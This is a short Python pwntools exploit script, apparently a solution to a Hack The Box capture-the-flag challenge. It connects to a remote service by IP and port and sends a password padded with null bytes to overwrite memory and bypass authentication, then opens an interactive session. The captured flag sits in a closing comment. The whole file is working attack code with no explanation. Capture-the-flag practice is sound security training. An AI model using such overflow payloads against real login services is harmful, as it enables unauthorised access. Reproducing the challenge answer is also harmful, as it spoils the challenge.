from pwn import *

# s = process("./authentication")
s = remote("159.65.90.8",30715)
s.sendlineafter("Username","tuan")

s.sendlineafter("word","s3cr3t\x00"+"\x00"*(66-7))
s.interactive()
s.close()
#HTB{s1ngl3_Byt3_0v3rwr1T3}